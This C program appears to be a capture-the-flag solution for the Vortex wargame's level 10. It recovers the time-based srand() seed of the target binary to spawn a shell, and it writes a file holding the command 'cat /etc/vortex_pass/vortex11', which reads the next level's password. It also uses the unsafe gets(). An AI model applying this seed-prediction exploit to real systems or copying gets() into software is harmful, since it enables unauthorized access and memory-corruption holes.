#include <unistd.h>
#include <sys/times.h>
#include <stdio.h>
#include <stdlib.h>

// we run `date +%s; /vortex/vortex10` to get the time
//  then we run this program, copy the contents of seedfile into the input of the vortex program, and hopefully a shell is spawned, you might have to hit enter or type the `cat` command again before the Alarm goes off.

int main() {
  char timebuf[16];
  char randbuf[16];
  int time;
  int target;
  printf("Start Time: ");
  gets(timebuf);
  printf("Generated Number: ");
  gets(randbuf);
  time = atoi(timebuf);
  target = strtoul(randbuf, NULL, 16);
  printf("\nTime: %08x\nTarget: %08x\n", time, target);
  
  int rando;
  int seed;
  int i;
  for(seed = 0x80; seed < 0x180; seed++) {
    srand(seed + time);
    for(i = 0; i < 512; i++) {
      rando = rand();
      if (rando == target) {
	rando = rand();
	printf("Seed: %08x, r:%08x\n", seed + time, rando);
	int s = seed + time;
	FILE *fp;
	fp = fopen("seedfile", "w");
	fprintf(fp, "%c%c%c%c\ncat /etc/vortex_pass/vortex11", s & 0xff, (s >> 8) & 0xff, (s >> 16) & 0xff, (s >> 24) & 0xff);
	fclose(fp);
	break;
      }
    }
  }
  
  return 0;
}
